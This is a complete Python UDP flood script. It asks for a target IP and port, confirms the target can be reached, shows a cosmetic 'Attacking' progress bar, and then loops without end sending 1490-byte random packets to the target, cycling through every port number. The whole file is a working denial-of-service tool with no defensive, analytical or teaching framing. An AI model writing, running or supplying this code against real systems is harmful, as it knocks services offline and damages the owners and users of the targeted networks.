import sys
import os
import time
import socket
import random
from datetime import datetime
from tqdm import tqdm
from colorama import init, Fore, Back, Style

# colorama
init()

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = str(input(Fore.GREEN + "IP : "))
port = int(input("Port : "))

def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

def can_connect_to_target(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.close()
        return True
    except socket.error:
        return False

if is_connected():
    if can_connect_to_target(ip, port):
        print(Fore.GREEN + "Connected to the target IP and port.")
        os.system("clear")

        for i in tqdm(range(100), desc='Attacking', unit='s', colour='red'):
            time.sleep(0.1)

        sent = 0
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print(Fore.GREEN + "Sent %s packet to %s through port:%s" % (sent, ip, port))
            if port == 65534:
                port = 1
    else:
        print(Fore.RED + "Cannot connect to the target IP and port.")
else:
    print(Fore.RED + "Not connected to the internet")